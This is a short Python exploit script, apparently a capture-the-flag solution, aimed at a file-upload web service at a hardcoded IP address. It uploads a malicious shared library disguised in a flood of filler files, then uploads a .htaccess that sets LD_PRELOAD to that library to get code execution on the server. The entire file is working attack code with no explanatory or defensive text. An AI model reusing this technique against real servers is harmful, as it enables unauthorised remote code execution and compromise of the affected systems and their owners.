import requests
from pwn import *


def upload_pwnlib(payload):
    resp = requests.post('http://47.243.75.225:31337/upload?formid=fff', files={"fff": ("pwn.html", payload)})
    print(resp.text)
    loc = resp.text[44:].replace("fff.html", "pwn.so")
    sleep(1)
    files = {}
    for x in range(0x20):
        files[str(x)] = (str(x), b"content")
    
    files["fff"] = ("pwn.so", payload)
    resp = requests.post('http://47.243.75.225:31337/upload?formid=fff', files=files)
    print(resp.text)
    return loc

def upload_htaccess(payload):
    resp = requests.post('http://47.243.75.225:31337/upload?formid=fff', files={"fff": ("fff.html", payload)})
    print(resp.text)
    loc = resp.text[17:]

    sleep(1)
    files = {}
    for x in range(0x20):
        files[str(x)] = (str(x), b"content")
    
    files["fff"] = (".htaccess", payload)
    sleep
    resp = requests.post('http://47.243.75.225:31337/upload?formid=fff', files=files)
    print(resp.text)
    sleep(1)
    resp = requests.get(loc)
    print(resp.text)

if __name__ == "__main__":
    lib = upload_pwnlib(open("docker/pwn.so", "rb"))
    sleep(1)
    htaccess = """
SetEnv LD_PRELOAD /var/www/html/{}
SetOutputFilter 7f39f8317fgzip
""".format(lib)
    upload_htaccess(htaccess)
